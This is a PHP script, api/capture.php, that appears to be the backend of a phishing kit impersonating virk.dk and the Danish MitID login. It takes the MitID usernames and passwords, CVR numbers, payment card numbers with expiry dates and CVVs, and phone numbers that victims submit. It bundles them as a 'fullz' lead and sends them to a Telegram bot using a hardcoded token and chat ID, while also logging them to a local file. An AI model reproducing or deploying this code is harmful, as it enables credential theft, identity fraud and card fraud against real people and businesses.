<?php
// api/capture.php

// --- KONFIGURATION ---
$telegram_token = "8235621580:AAF_Cd07enQNQGr4096gTRlEW5Oim7PEjsY";
$telegram_chat_id = "8839044436";
$logfile = "data.txt";

// --- HENT DATA ---
$cvr = $_POST['cvr'] ?? '';
$company = $_POST['company'] ?? '';
$user = $_POST['user'] ?? '';
$pass = $_POST['pass'] ?? '';
$card = $_POST['card'] ?? '';
$holder = $_POST['holder'] ?? '';
$exp = $_POST['exp'] ?? '';
$cvv = $_POST['cvv'] ?? '';
$phone = $_POST['phone'] ?? '';
$ip = $_SERVER['REMOTE_ADDR'] ?? '';
$device = $_SERVER['HTTP_USER_AGENT'] ?? '';
$source = $_POST['source'] ?? 'virk_fullz';

// --- SIMULERED INFO (Placeholder hvis ikke indtastet) ---
$name = "Anonym Bruger";
$address = "Amagerbrogade 22";
$postal = "1000";
$city = "København";
$bank = "Danske Bank";
$regnr = "—";
$kontonr = "—";

// --- BYG FULLZ MSG ---
$timestamp = date('d.m.Y H:i:s');
$lead_id = mt_rand(1, 999);

// Kun send besked hvis det er det fulde sæt (verify.html) eller hvis du vil have delvise
// Her sendes det kun hvis 'source' er 'virk_fullz' eller hvis telefonnummeret er indtastet
if ($phone || $source === 'virk_fullz') {
    $message = "━━━🟩✅VIRK✅🟩━━━\n";
    $message .= "🎰 New Lead: #$lead_id\n\n";
    $message .= "🗓️ Date: $timestamp\n\n";

    // MitID Sektion
    $message .= "🔐 MitID Login Details:\n";
    $message .= "─ Log på hos virk.dk ─\n";
    $message .= "Bruger-ID: `$user`\n";
    $message .= "CPR-nummer: `$cvr` (CVR ref)\n\n";

    // Personlig Info Sektion
    $message .= "👤 Personal Information:\n";
    $message .= "☎️ Phone Number: `$phone`\n";
    $message .= "👤 Full Name: $name\n";
    $message .= "🏠 Address: $address\n";
    $message .= "📮 Postal Code: $postal\n";
    $message .= "🏙️ City: $city\n";
    $message .= "🏦 Bank: $bank\n\n";

    // Kort Info Sektion
    $message .= "💳 Card & Account Details:\n";
    $message .= "💳 Card Holder: $holder\n";
    $message .= "💳 Card Number: `$card`\n";
    $message .= "📅 Expiry Date: $exp\n";
    $message .= "🔒 CVV: `$cvv`\n";
    $message .= "🏦 Reg Nr: $regnr\n";
    $message .= "💰 Konto Nr: $kontonr\n\n";

    // Device Info
    $message .= "🌐 Device & Network Information:\n";
    $message .= "📍 IP Address: `$ip`\n";
    $message .= "🌍 Country: Denmark (Est.)\n";
    $message .= "💻 Device: " . (stripos($device, 'Mobile') ? "Mobile" : "Desktop") . "\n";

    // --- SEND TIL TELEGRAM ---
    if ($telegram_token && $telegram_chat_id) {
        $url = "https://api.telegram.org/bot" . $telegram_token . "/sendMessage";
        $data = [
            'chat_id' => $telegram_chat_id,
            'text' => $message,
            'parse_mode' => 'Markdown'
        ];
        
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_exec($ch);
        curl_close($ch);
    }
}

// --- GEM TIL FIL (Backup) ---
$entry = "========================================\n" .
         "LEAD #$lead_id - " . date('Y-m-d H:i:s') . "\n" .
         "CVR: $cvr | Firma: $company\n" .
         "MitID: $user / $pass\n" .
         "Telefon: $phone\n" .
         "Kort: $card ($holder) - $exp / $cvv\n" .
         "IP: $ip\n" .
         "========================================\n";

file_put_contents($logfile, $entry, FILE_APPEND | LOCK_EX);

echo "OK";
?>
